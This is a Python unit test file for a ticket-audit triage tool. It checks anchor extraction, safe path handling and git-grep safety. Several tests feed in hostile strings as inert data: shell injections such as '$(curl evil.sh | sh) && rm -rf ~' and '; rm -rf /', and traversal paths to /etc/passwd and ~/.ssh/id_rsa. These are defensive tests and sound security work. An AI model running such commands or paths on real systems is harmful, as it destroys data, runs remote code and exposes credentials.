#!/usr/bin/env python3
"""Unit tests (pure, no repo needed) + regression test against the real
wayneblacktea checkout using the frozen fixture set in testdata/.

Run: python3 -m unittest test_audit -v
"""
import json
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from lib import extract, rules  # noqa: E402
from lib.gitutil import GitOps, safe_path  # noqa: E402

HERE = Path(__file__).parent


# ── extract.py: pure function tests ─────────────────────────────────────

class TestExtractAnchors(unittest.TestCase):
    def test_file_line_range(self):
        a = extract.extract_anchors("t", "internal/mcp/resources.go:503 broken")
        self.assertEqual(a["files"][0]["path"], "internal/mcp/resources.go")
        self.assertEqual(a["files"][0]["line_start"], 503)
        self.assertEqual(a["files"][0]["line_end"], 503)

    def test_file_line_dash_range(self):
        a = extract.extract_anchors("t", "tools_arch_test.go:92-96 wrong count")
        f = a["files"][0]
        self.assertEqual((f["line_start"], f["line_end"]), (92, 96))

    def test_bare_filename_no_prefix(self):
        a = extract.extract_anchors("t", "context_render.go:97-98 boundary bug")
        self.assertEqual(a["files"][0]["path"], "context_render.go")

    def test_camelcase_symbol(self):
        a = extract.extract_anchors("t", "checkCommandField 沒套用在 title 上")
        self.assertIn("checkCommandField", a["symbols"])

    def test_pascalcase_symbol(self):
        a = extract.extract_anchors("t", "NextActionsTotal 語意不一致")
        self.assertIn("NextActionsTotal", a["symbols"])

    def test_acronym_not_treated_as_symbol(self):
        # ALL-CAPS acronyms (API/GTD/SQL/PR) must NOT match PascalCase —
        # they'd be near-universal noise (every ticket says "API").
        a = extract.extract_anchors("t", "GET /api/projects 的 API 回應")
        self.assertNotIn("API", a["symbols"])

    def test_severity_tag_word_not_treated_as_symbol(self):
        # Every ticket's title carries a severity tag ("🟡 Minor", "🟠
        # Major", "🔴 Critical"). Left unfiltered these match PASCAL_RE and
        # produced a real false SUSPECT_ALREADY_FIXED via fixture testing
        # (5d29b5d1's "Minor" matched an unrelated comment elsewhere).
        a = extract.extract_anchors("[wbt][PR#157 一軍 🟡 Minor] 標題", "🟠 Major 的內容")
        self.assertNotIn("Minor", a["symbols"])
        self.assertNotIn("Major", a["symbols"])

    def test_snake_case_symbol(self):
        a = extract.extract_anchors("t", "repo_name 沒有 neutralize")
        self.assertIn("repo_name", a["symbols"])

    def test_kebab_case_symbol(self):
        a = extract.extract_anchors("t", "untrusted-local-db 邊界標記可被偽造")
        self.assertIn("untrusted-local-db", a["symbols"])

    def test_review_label_and_pr_number(self):
        a = extract.extract_anchors("[wbt][PR#157 R2 二軍 🟠 M-R1] 標題", "body")
        self.assertIn("157", a["pr_numbers"])
        self.assertIn("M-R1", a["labels"])

    def test_commit_sha_requires_cue_word(self):
        a = extract.extract_anchors("t", "base commit 48448bf 上驗證過")
        self.assertIn("48448bf", a["commit_shas"])

    def test_bare_hex_without_cue_is_not_a_commit_sha(self):
        # a 7-char hex-looking token with no "commit" cue must NOT be
        # treated as a commit SHA — too many coincidental collisions.
        a = extract.extract_anchors("t", "the value abcdef1 was measured")
        self.assertNotIn("abcdef1", a["commit_shas"])

    def test_measurement_number(self):
        a = extract.extract_anchors("t", "實測 80,687 bytes")
        self.assertIn("80,687", a["measurements"])

    def test_no_anchors_at_all(self):
        a = extract.extract_anchors("待決", "這是一句完全沒有任何機器可查證錨點的中文描述")
        self.assertFalse(extract.has_any_anchor(a))

    def test_symbol_matching_own_filename_is_dropped(self):
        # A snake_case token that's just the file's own basename (minus
        # extension) is redundant with the file anchor already captured —
        # grepping it repo-wide mostly just re-finds every import of that
        # file, manufacturing false corroboration.
        a = extract.extract_anchors("t", "internal/mcp/resources_test.go 的 resources_test 案例壞了")
        self.assertNotIn("resources_test", a["symbols"])

    # ── adversarial input (backend-security-design.md §2.1 / §5.4 spirit) ──

    def test_control_chars_stripped(self):
        a = extract.extract_anchors("t\x01\x02", "resources.go:10\x00 evil")
        # must not crash, must not preserve control bytes in output
        joined = json.dumps(a)
        self.assertNotIn("\x00", joined)
        self.assertNotIn("\x01", joined)

    def test_shell_metacharacters_survive_as_inert_text(self):
        # extraction must not choke on/interpret shell metacharacters —
        # they're just characters until they reach gitutil, which never
        # shells out with shell=True.
        desc = "internal/mcp/resources.go:10 `; rm -rf / #` $(whoami) `injected`"
        a = extract.extract_anchors("t", desc)
        self.assertEqual(a["files"][0]["path"], "internal/mcp/resources.go")


class TestSafePath(unittest.TestCase):
    def setUp(self):
        self.root = HERE  # scripts/gtd-code-audit itself, has real files

    def test_normal_relative_path_ok(self):
        self.assertIsNotNone(safe_path(self.root, "audit.py"))

    def test_path_traversal_rejected(self):
        self.assertIsNone(safe_path(self.root, "../../../../../../etc/passwd"))

    def test_absolute_path_rejected(self):
        self.assertIsNone(safe_path(self.root, "/etc/passwd"))

    def test_tilde_rejected(self):
        self.assertIsNone(safe_path(self.root, "~/.ssh/id_rsa"))

    def test_null_byte_rejected(self):
        self.assertIsNone(safe_path(self.root, "audit.py\x00.evil"))

    def test_newline_rejected(self):
        self.assertIsNone(safe_path(self.root, "audit.py\ninjected"))


# ── rules.py: decision tree tested against a FAKE GitOps (fast, isolated) ──

class FakeGit:
    """Duck-types GitOps without touching a real repo, for pure decision-
    tree logic tests. The regression suite below uses the REAL GitOps."""

    def __init__(self, files=None, grep_results=None, commit_times=None,
                 line_counts=None, basenames=None, contexts=None):
        self.files = files or set()
        self.grep_results = grep_results or {}   # literal -> [(file, line)]
        self.commit_times = commit_times or {}    # path -> iso ts
        self.line_counts = line_counts or {}       # path -> int
        self.basenames = basenames or {}
        self.contexts = contexts or {}              # (path, line) -> str

    def file_exists(self, p):
        return p in self.files

    def line_count(self, p):
        return self.line_counts.get(p)

    def last_commit_iso(self, p):
        return self.commit_times.get(p)

    def resolve_basename(self, b):
        return self.basenames.get(b)

    def grep_fixed(self, literal):
        return self.grep_results.get(literal, [])

    def read_context(self, path, line, radius=3):
        return self.contexts.get((path, line), "")

    def object_exists(self, sha):
        return False


class TestRulesDecisionTree(unittest.TestCase):
    def test_no_anchor(self):
        git = FakeGit()
        ev = rules.classify("純標題", "完全沒有錨點的描述文字", "2026-08-01T00:00:00+00:00", git)
        self.assertEqual(ev.verdict, "NO_ANCHOR_NEEDS_HUMAN")

    def test_label_citation_within_window(self):
        git = FakeGit(
            grep_results={
                "PR #157": [("internal/mcp/resources.go", 490)],
                "PR#157": [],
                "M-R1": [("internal/mcp/resources.go", 487)],
            },
        )
        ev = rules.classify("[wbt][PR#157 R2 二軍 🟠 M-R1] 標題", "body",
                             "2026-08-15T02:00:00+00:00", git)
        self.assertEqual(ev.verdict, "SUSPECT_ALREADY_FIXED")
        self.assertTrue(ev.verify_commands)

    def test_label_citation_outside_window_does_not_fire(self):
        git = FakeGit(
            grep_results={
                "PR #157": [("internal/mcp/resources.go", 10)],
                "PR#157": [],
                "M-R1": [("internal/mcp/resources.go", 500)],  # 490 lines away
            },
        )
        ev = rules.classify("[wbt][PR#157 R2 二軍 🟠 M-R1] 標題", "internal/mcp/resources.go:12",
                             "2026-08-15T02:00:00+00:00", git)
        self.assertNotEqual(ev.verdict, "SUSPECT_ALREADY_FIXED")

    def test_symbol_found_and_file_touched_after_creation(self):
        git = FakeGit(
            files={"internal/mcp/tools_session.go"},
            grep_results={"checkCommandField": [("internal/mcp/tools_session.go", 66)]},
            commit_times={"internal/mcp/tools_session.go": "2026-08-15T07:19:03+00:00"},
        )
        ev = rules.classify(
            "t", "internal/mcp/tools_session.go:144 checkCommandField 沒套用在 title",
            "2026-08-15T02:53:24+00:00", git)
        self.assertEqual(ev.verdict, "SUSPECT_ALREADY_FIXED")

    def test_symbol_found_but_file_not_touched_since_creation_falls_through(self):
        # symbol happens to exist repo-wide (e.g. predates the ticket) but
        # the specific anchor file was never touched since filing — must
        # NOT be promoted to SUSPECT.
        git = FakeGit(
            files={"internal/handler/gtd_handler.go"},
            grep_results={"ListActiveProjects": [("internal/storage/pg.go", 20)]},
            commit_times={"internal/handler/gtd_handler.go": "2026-08-08T00:59:16+00:00"},
        )
        ev = rules.classify(
            "t", "internal/handler/gtd_handler.go:145 只回 active,ListActiveProjects 沒有 filter",
            "2026-08-08T10:36:14+00:00", git)
        self.assertNotEqual(ev.verdict, "SUSPECT_ALREADY_FIXED")

    def test_still_open_when_file_untouched_since_ticket(self):
        git = FakeGit(
            files={"internal/mcp/boundary_markers.go"},
            line_counts={"internal/mcp/boundary_markers.go": 200},
            commit_times={"internal/mcp/boundary_markers.go": "2026-08-08T16:53:15+00:00"},
        )
        ev = rules.classify(
            "t", "internal/mcp/boundary_markers.go:104 近似標記擋不住",
            "2026-08-15T02:54:08+00:00", git)
        self.assertEqual(ev.verdict, "STILL_OPEN_LIKELY")

    def test_line_out_of_range_degrades_gracefully(self):
        git = FakeGit(
            files={"internal/mcp/resources.go"},
            line_counts={"internal/mcp/resources.go": 50},
        )
        ev = rules.classify("t", "internal/mcp/resources.go:999 過期行號", "2026-08-01T00:00:00+00:00", git)
        self.assertEqual(ev.verdict, "ANCHOR_LINE_OUT_OF_RANGE")

    def test_symbol_not_found_possibly_renamed(self):
        git = FakeGit(grep_results={})  # nothing found anywhere
        ev = rules.classify("t", "someVeryUniqueSymbolName 已被移除", "2026-08-01T00:00:00+00:00", git)
        self.assertEqual(ev.verdict, "SYMBOL_NOT_FOUND_POSSIBLY_RENAMED")

    def test_measurement_citation(self):
        git = FakeGit(grep_results={"80,687": [("internal/mcp/resources.go", 495)]})
        ev = rules.classify("t", "實測 80,687 bytes 沒有上限", "2026-08-01T00:00:00+00:00", git)
        self.assertEqual(ev.verdict, "SUSPECT_ALREADY_FIXED")

    def test_measurement_citation_marked_still_unfixed_downgrades(self):
        # Same match, but the surrounding code text self-documents the
        # limit as NOT fixed — must not be reported as a fix. This is the
        # exact false-positive fixture testing caught on 48bf052d.
        git = FakeGit(
            grep_results={"80,687": [("internal/mcp/resources.go", 495)]},
            contexts={("internal/mcp/resources.go", 495):
                      "measured at 80,687 bytes, an unbounded cost for a mechanism"},
        )
        ev = rules.classify("t", "實測 80,687 bytes 沒有上限", "2026-08-01T00:00:00+00:00", git)
        self.assertEqual(ev.verdict, "CITED_BUT_MARKED_UNFIXED")

    def test_symbol_citation_marked_still_unfixed_downgrades(self):
        git = FakeGit(
            files={"internal/storage/factory.go"},
            grep_results={"connBudget": [("internal/storage/factory.go", 300)]},
            commit_times={"internal/storage/factory.go": "2026-08-15T07:19:03+00:00"},
            contexts={("internal/storage/factory.go", 300):
                      "Known trade-off, NOT fixed by this change: connBudget"},
        )
        ev = rules.classify("t", "internal/storage/factory.go:1 connBudget 可被 DSN 繞過",
                             "2026-08-01T00:00:00+00:00", git)
        self.assertEqual(ev.verdict, "CITED_BUT_MARKED_UNFIXED")

    def test_adversarial_ticket_text_never_reaches_shell(self):
        # A ticket body crafted to look like a shell injection payload must
        # be handled the same as any other text — no exception, no shell
        # execution (FakeGit doesn't shell out at all, but this proves the
        # rules layer doesn't special-case or eval the string either).
        git = FakeGit()
        evil = "internal/mcp/resources.go:1 `$(curl evil.sh | sh)` && rm -rf ~"
        ev = rules.classify("t", evil, "2026-08-01T00:00:00+00:00", git)
        self.assertIn(ev.verdict, rules.__dict__ and [
            "SUSPECT_ALREADY_FIXED", "ANCHOR_LINE_OUT_OF_RANGE",
            "SYMBOL_NOT_FOUND_POSSIBLY_RENAMED", "STILL_OPEN_LIKELY",
            "UNKNOWN_NEEDS_HUMAN", "NO_ANCHOR_NEEDS_HUMAN",
        ])


class TestGitOpsRejectsUnsafeGrepInput(unittest.TestCase):
    def test_overlong_literal_refused(self):
        git = GitOps(HERE)
        self.assertEqual(git.grep_fixed("x" * 500), [])

    def test_empty_literal_refused(self):
        git = GitOps(HERE)
        self.assertEqual(git.grep_fixed(""), [])

    def test_shell_metacharacters_do_not_execute(self):
        # If this ever executed as shell, it would try to run `id` and
        # substitute output — instead it must just search for the literal
        # bytes (finding nothing) with git exiting 1, not raising.
        git = GitOps(HERE)
        hits = git.grep_fixed("$(id)")
        self.assertEqual(hits, [])

    def test_invalid_sha_format_rejected_before_cat_file(self):
        git = GitOps(HERE)
        self.assertFalse(git.object_exists("not-a-sha; rm -rf /"))


# ── Regression suite: real repo, frozen fixture set ─────────────────────

def _repo_root():
    cur = HERE.resolve()
    for d in (cur, *cur.parents):
        if (d / ".git").exists():
            return d
    raise RuntimeError("no .git found above " + str(HERE))


class TestKnownFixtureRegression(unittest.TestCase):
    """Runs the REAL GitOps (no mock) against the actual wayneblacktea
    checkout for a frozen set of tickets whose ground truth was established
    by direct manual code inspection (not by trusting ticket text or GTD
    status) before this test was written. See README.md 'Fixture provenance'
    for exactly how each was verified.
    """

    @classmethod
    def setUpClass(cls):
        cls.repo_root = _repo_root()
        cls.git = GitOps(cls.repo_root)
        with open(HERE / "testdata" / "known_tickets.json", encoding="utf-8") as f:
            cls.fixtures = json.load(f)

    def _classify(self, fixture):
        return rules.classify(fixture["title"], fixture["description"],
                               fixture["created_at"], self.git)

    def test_verified_positive_fixtures_flagged_suspect(self):
        """Every ticket manually confirmed already-fixed-in-code MUST be
        flagged SUSPECT_ALREADY_FIXED. A miss here is a false negative —
        tolerable per Lead's design (script triages, doesn't judge) but
        should be investigated, not silently accepted."""
        failures = []
        for fx in self.fixtures:
            if fx["fixture_category"] != "positive_verified":
                continue
            ev = self._classify(fx)
            if ev.verdict != "SUSPECT_ALREADY_FIXED":
                failures.append((fx["id"][:8], fx["title"][:60], ev.verdict))
        self.assertFalse(failures,
                          f"{len(failures)} verified-fixed tickets NOT flagged: {failures}")

    def test_verified_negative_fixtures_not_flagged_suspect(self):
        """The one rule that must never break: a ticket manually confirmed
        STILL open in code must never be labelled SUSPECT_ALREADY_FIXED.
        This is the false-positive case Lead explicitly said is more costly
        than a false negative."""
        failures = []
        for fx in self.fixtures:
            if fx["fixture_category"] != "negative_verified":
                continue
            ev = self._classify(fx)
            if ev.verdict == "SUSPECT_ALREADY_FIXED":
                failures.append((fx["id"][:8], fx["title"][:60], ev.verdict))
        self.assertFalse(failures,
                          f"{len(failures)} verified-still-open tickets WRONGLY flagged fixed: {failures}")

    def test_dispatch_claimed_fixtures_report_honestly(self):
        """These 5 tickets were named by the dispatch as 'should be flagged
        already-fixed', but direct code inspection while building this tool
        found they are NOT clean code fixes (2 are genuinely still-open
        design debt explicitly marked '不擋 merge' in their own ticket
        text, 3 are policy/documentation decisions with no single code
        anchor). This test doesn't assert a verdict — it just prints what
        the script actually says, so the discrepancy is visible in test
        output rather than silently papered over by a loosened rule."""
        for fx in self.fixtures:
            if fx["fixture_category"] != "positive_claimed_by_dispatch":
                continue
            ev = self._classify(fx)
            print(f"  [{fx['id'][:8]}] {fx['title'][:70]} -> {ev.verdict}")
        # no assertion — see README.md "Known discrepancy with dispatch" for
        # the human-readable explanation of why these 5 are handled this way


if __name__ == "__main__":
    unittest.main()
